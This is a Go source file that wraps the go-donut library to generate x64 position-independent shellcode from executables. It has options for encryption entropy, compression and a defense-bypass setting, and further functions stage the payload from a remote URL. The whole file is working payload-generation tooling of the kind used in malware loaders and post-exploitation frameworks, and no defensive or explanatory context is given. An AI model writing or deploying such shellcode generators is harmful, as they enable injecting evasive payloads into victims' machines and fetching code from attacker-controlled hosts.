package main

import (
	"bytes"
	"github.com/Binject/go-donut/donut"
)

func getDonut(data []byte, config *donut.DonutConfig) ([]byte, error) {
	buf := bytes.NewBuffer(data)
	res, err := donut.ShellcodeFromBytes(buf, config)
	if err != nil {
		return nil, err
	}
	return res.Bytes(), nil
}

func GenerateDonutShellcode(payloadPath string, entropy int, compression int, bypass int, exit int, params string) ([]byte, error) {

	config := donut.DonutConfig{
		InstType:   donut.DONUT_INSTANCE_PIC,
		Parameters: params,
		Bypass:     bypass,
		Format:     uint32(1),
		Arch:       donut.X64,
		Entropy:    uint32(entropy),
		Compress:   uint32(compression),
		ExitOpt:    uint32(exit),
		Unicode:    0,
	}

	payload, err := donut.ShellcodeFromFile(payloadPath, &config)
	if err != nil {
		return nil, err
	}
	return payload.Bytes(), nil
}

func GenerateDonutShellcodeURL(pe []byte, url string, entropy int, compression int, bypass int, exit int, params string) ([]byte, error) {

	config := donut.DonutConfig{
		InstType:   donut.DONUT_INSTANCE_PIC,
		Parameters: params,
		Bypass:     bypass,
		Format:     uint32(1),
		Arch:       donut.X64,
		Entropy:    uint32(entropy),
		Compress:   uint32(compression),
		ExitOpt:    uint32(exit),
		Unicode:    0,
		URL:        url,
	}

	payload, err := getDonut(pe, &config)
	if err != nil {
		return nil, err
	}
	return payload, nil
}

func GenerateDonutShellcodeURLDownload(url string, entropy int, compression int, bypass int, exit int, params string) ([]byte, error) {

	config := donut.DonutConfig{
		InstType:   donut.DONUT_INSTANCE_PIC,
		Parameters: params,
		Bypass:     bypass,
		Format:     uint32(1),
		Arch:       donut.X64,
		Entropy:    uint32(entropy),
		Compress:   uint32(compression),
		ExitOpt:    uint32(exit),
		Unicode:    0,
		URL:        url,
	}

	payload, err := donut.ShellcodeFromURL(url, &config)
	if err != nil {
		return nil, err
	}
	return payload.Bytes(), nil
}
